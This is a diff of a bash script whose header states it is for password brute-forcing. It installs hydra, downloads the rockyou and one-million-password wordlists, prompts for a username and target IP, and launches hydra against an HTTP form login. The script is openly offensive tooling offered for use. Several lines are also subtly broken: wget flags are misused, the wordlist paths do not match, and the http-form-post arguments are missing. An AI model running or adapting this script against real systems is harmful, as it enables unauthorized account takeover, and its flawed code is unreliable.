@@ -1,4 +1,7 @@
 #!/bin/bash
+#
+# Author: Joseph Hurley
+# Purpose: Password brute-forcing
 
 # ANSI escape Codes (for colored output, -e required on echo)
 RED='\033[0;31m'
@@ -8,13 +11,17 @@ NC='\033[0m' # No Color
 # install required packages
 echo -e "downloading reqired packages..."
 sudo apt install hydra
-sudo apt install zenity
+
+# create directories
+mkdir ~/pwbruteforcer
+mkdir ~/pwbruteforcer/wordlists
 
 # download and unpack wordlists
 echo -e "$GREEN""downloading wordlists""$NC"
-wget -q https://github.com/Sephley/Hydra/blob/main/wordlists/rockyou.txt.gz
-#gzip -d wordlists/rockyou.txt.gz 
-wget -q https://github.com/Sephley/Hydra/blob/main/wordlists/10-million-password-list-top-1000000.txt
+wget -q https://github.com/Sephley/Hydra/blob/main/wordlists/rockyou.txt.gz -o ~/pwbruteforcer/wordlists
+wget -q https://github.com/Sephley/Hydra/blob/main/wordlists/1milpwlist.txt -o ~/pwbruteforcer/wordlists
+echo -e "$GREEN""de-compressing wordlists""$NC"
+gzip -dc wordlists/rockyou.txt.gz ~/pwbruteforcer/wordlists/rockyou.txt
 
 echo -e "$GREEN""enter username: ""$NC"
 read -r USERNAME
@@ -22,10 +29,20 @@ read -r USERNAME
 echo -e "$GREEN""type your destined IP-Address: ""$NC"
 read -r IPADDRESS
 
-echo -e "$GREEN""select the wordlist you would like to use\n""$NC"
-select d in */wordlists/; do test -n "$d" && break; echo -e "$RED>>> Invalid Selection""$NC"; done
-cd "$d" && pwd
+# variables for wordlists
+ROCKYOU='rockyou.txt'
+ONEMILPWLIST='1milpwlist.txt'
 
-hydra -l "$USERNAME" -P "" "$IPADDRESS" -V http-form-post
+echo -e "$GREEN""select the wordlist you would like to use\n""$NC"
+select d in rockyou.txt 1milpwlist.txt; 
+do test -n "$d" && break; 
+echo -e "$RED>>> Invalid Selection""$NC"; done
+
+if [ "$REPLY" == 1 ] ;
+then echo -e "you picked the following wordlist: rockyou.txt"
+hydra -l "$USERNAME" -P ~/pwbruteforcer/wordlist/$ROCKYOU "$IPADDRESS" -V http-form-post
+else echo -e "you picked the following wordlist: 1milpwlist.txt"
+hydra -l "$USERNAME" -P ~/pwbruteforcer/wordlist/$ONEMILPWLIST "$IPADDRESS" -V http-form-post
+fi
 
 # use pw-inspector to filter?
